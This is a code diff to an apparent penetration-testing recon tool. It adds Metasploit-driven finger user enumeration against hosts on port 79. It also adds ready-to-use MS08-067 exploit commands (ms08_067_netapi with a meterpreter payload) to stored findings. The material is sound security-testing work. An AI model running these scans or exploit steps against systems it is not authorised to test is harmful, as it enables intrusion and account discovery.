@@ -197,6 +197,7 @@ class FastInitialRecon:
             '14': self.checkDNSForHostname,
             '15': self.checkSNMPForDefaultCommunities,
             '16': self.checkMSSQLDefaultCreds,
+            '17': self.checkFingerUsers,
             '1M': self.printMainMenu,
             '20': self.printCurrentData,
             '21': self.addUsername,
@@ -323,6 +324,7 @@ class FastInitialRecon:
         print ('  4 - Run Hostname in DNS checker')
         print ('  5 - Check SNMP Services For Default Communities')
         print ('  6 - Check for Default MSSQL Creds')
+        print ('  7 - Finger service user enumeration')
         print ('  M - Main Menu')
         print (' >> ')
         choice = self.readchar.readkey()
@@ -400,8 +402,6 @@ class FastInitialRecon:
         targets = self.databaseTransaction(
             "SELECT DISTINCT hosts.host FROM hosts, openPorts WHERE hosts.id=openPorts.hostID AND (openPorts.portNum=445 OR openPorts.portNum=139) AND openPorts.portType = 1 ORDER BY hosts.host")
         for host in targets:
-            smbSharesScanResultValue = ''
-            smbSharesScanResultType = ''
             smbSharesProcess = self.subprocess.Popen(["smbclient", "-N", "-L", host[0]], stdout=self.subprocess.PIPE,
                                                      stderr=self.subprocess.STDOUT)
             smbSharesScanResult = self.re.sub('\t', '', self.re.sub(' +', ' ', self.grep(
@@ -501,6 +501,7 @@ class FastInitialRecon:
         self.checkDNSForHostname()
         self.checkDNSForAXFR()
         self.checkMSSQLDefaultCreds()
+        self.checkFingerUsers()
 
     def singlePortScan_TCP(self, targetPort):
         nm = self.nmap.PortScanner()
@@ -603,7 +604,7 @@ class FastInitialRecon:
             except IndexError:
                 continue
             if msfFinding:
-                self.storeFinding(host[0], 445, 1, "MS08-067 checker", msfFinding)
+                self.storeFinding(host[0], 445, 1, "MS08-067 checker", msfFinding + "\n Use something like this in MSF:\nuse exploit/windows/smb/ms08_067_netapi\nset PAYLOAD windows/meterpreter/bind_tcp\nset RHOST " + host[0] + "\nexploit")
 
     def checkDNSForAXFR(self):
         print ("Checking for AXFR on DNS servers")
@@ -690,3 +691,13 @@ class FastInitialRecon:
                     resultsFull = 'Attempt with ' + username[0] + " / " + password[0] + ' against ' + target[0] + '\n'
                     resultsFull = resultsFull + self.executeMSFcommand(self.msfConsole, 'run')
                     self.storeFinding(target[0], 1433, 1, 'MSSQL Default Creds Checker', resultsFull)
+
+    def checkFingerUsers(self):
+        print("Checking for finger service user enumeration")
+        self.executeMSFcommand(self.msfConsole, 'use auxiliary/scanner/finger/finger_users')
+        targets = self.databaseTransaction("SELECT DISTINCT hosts.host FROM hosts, openPorts WHERE hosts.id=openPorts.hostID AND openPorts.portNum=79 AND openPorts.portType = 1 ORDER BY hosts.host")
+        for target in targets:
+            self.executeMSFcommand(self.msfConsole, 'set RHOSTS ' + target[0] + '/32')
+            resultsFull = 'Attempt against ' + target[0] + '\n'
+            resultsFull = resultsFull + self.executeMSFcommand(self.msfConsole, 'run')
+            self.storeFinding(target[0], 79, 1, 'Finger user enum checker', resultsFull)
